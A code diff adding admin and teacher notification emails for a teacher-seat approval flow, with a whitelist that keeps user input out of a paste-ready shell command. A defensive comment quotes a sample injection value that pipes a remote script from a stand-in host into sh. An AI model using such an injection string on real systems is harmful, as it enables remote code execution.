@@ -287,6 +287,92 @@ export function notifyAdminMarkUnfair(payload: {
   })
 }
 
+/**
+ * Anything pasted into a shell must not be able to end the argument it sits in.
+ *
+ * Deliberately a whitelist: an address that does not look like an address is
+ * dropped entirely rather than escaped, because the only use for this value is
+ * a command line and a half-sanitised one is worse than an absent one.
+ */
+function shellSafe(value: string | null): string | null {
+  if (!value) return null
+  return /^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/.test(value) ? value : null
+}
+
+/**
+ * A teacher has asked for their seat. This is the only alert in this file that
+ * is a queue rather than an FYI — nothing happens for the teacher until someone
+ * runs `pnpm teacher:grant --approve`, so the command to do it is in the body.
+ */
+export function notifyAdminTeacherSeatRequest(payload: {
+  accountEmail: string | null
+  schoolName: string
+  schoolEmail: string
+  schoolCountry: string | null
+  roleTitle: string | null
+  classSize: number | null
+}): void {
+  sendEmailAsync({
+    to: adminNotifyAddress(),
+    replyTo: payload.schoolEmail,
+    subject: `[${SITE_NAME}] Teacher seat request — ${payload.schoolName}`,
+    text: [
+      'A teacher has requested a verified seat. They are on the free tier until',
+      'this is approved, so they currently get 5 marks a month, not 300.',
+      '',
+      `Account:      ${payload.accountEmail ?? '(unknown)'}`,
+      `School:       ${payload.schoolName}`,
+      `School email: ${payload.schoolEmail}`,
+      `Country:      ${payload.schoolCountry ?? '—'}`,
+      `Role:         ${payload.roleTitle ?? '—'}`,
+      `Class size:   ${payload.classSize ?? '—'}`,
+      '',
+      'Review the queue:',
+      '  pnpm teacher:grant --pending',
+      '',
+      'Approve (grants the seat and closes the request):',
+      // The reason is NOT interpolated from the school name. This line is built
+      // to be pasted into a shell on a machine holding service-role credentials,
+      // and school_name is attacker-controlled: signup is open, and the field is
+      // only trimmed and length-capped, so `x"; curl evil.sh | sh; echo "` would
+      // otherwise produce a valid, paste-ready command. The reviewer reads the
+      // school above and the script fills the reason in from the stored request
+      // when none is given.
+      `  pnpm teacher:grant --approve ${shellSafe(payload.accountEmail) ?? '<email>'}`,
+    ].join('\n'),
+  })
+}
+
+/**
+ * The seat is on — sent from the grant script, so it is awaited rather than
+ * fire-and-forget (a CLI process exits before an unawaited send lands).
+ *
+ * Leads with the number, because that is the whole content of the news: the
+ * teacher asked for an allowance and now has one. The pending card on the desk
+ * promises this email, so it is not optional.
+ */
+export async function sendTeacherSeatApprovedEmail(payload: {
+  email: string
+  teacherCap: number
+}): Promise<boolean> {
+  return sendEmail({
+    to: payload.email,
+    subject: `Your ${SITE_NAME} teacher seat is on`,
+    preheader: `${payload.teacherCap} marks a month, free.`,
+    text: [
+      'Your teacher seat is verified.',
+      '',
+      `You now have ${payload.teacherCap} marks a month — free, for as long as you teach. ` +
+        'That is a class set of 30 marked several times a term, not the free ' +
+        'allowance you were on until now.',
+      '',
+      'Nothing to set up: your existing classes and invite codes already work. ' +
+        'Anything your students submit lands in your review inbox.',
+    ].join('\n'),
+    cta: { label: 'Open your classrooms', href: `${SITE_URL}/teacher/dashboard` },
+  })
+}
+
 export function notifyAdminWaitlistSignup(payload: {
   email: string
   whatsapp: string
